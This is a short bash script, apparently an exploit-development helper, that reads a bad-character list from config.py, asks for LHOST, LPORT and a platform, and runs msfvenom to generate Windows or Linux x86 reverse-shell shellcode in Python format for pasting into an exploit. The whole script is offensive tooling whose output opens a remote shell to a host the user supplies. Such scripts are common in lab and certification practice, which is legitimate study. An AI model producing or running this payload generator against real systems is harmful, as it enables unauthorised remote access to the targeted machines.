#!/bin/bash

cat ./config.py | grep BADCHARS | cut -d "[" -f2 | cut -d "]" -f1 > badchars.txt
sed -i 's/0x/\\x/g' badchars.txt
sed -i 's/,//g' badchars.txt
sed -i 's/\ //g' badchars.txt
bad=$(cat ./badchars.txt)

echo ""
echo -n " LHOST : "; read ip
echo -n " LPORT : "; read port
echo ""
echo " PLATFORM"
echo " (l = linux/x86/shell_reverse_tcp; w = windows/shell_reverse_tcp"
echo -n " : "; read p

# echo "$ip $port $bad $p"

case $p in

	w)
		msfvenom -p windows/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread > shellcode.py
		;;
	l)
		msfvenom -p linux/x86/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread > shellcode.py
		;;
	*)
		echo "Illegal choice"
		exit 1
esac

sed -i 's/=  b\"/=  \"/g' shellcode.py
sed -i 's/= b\"/= \"/g' shellcode.py
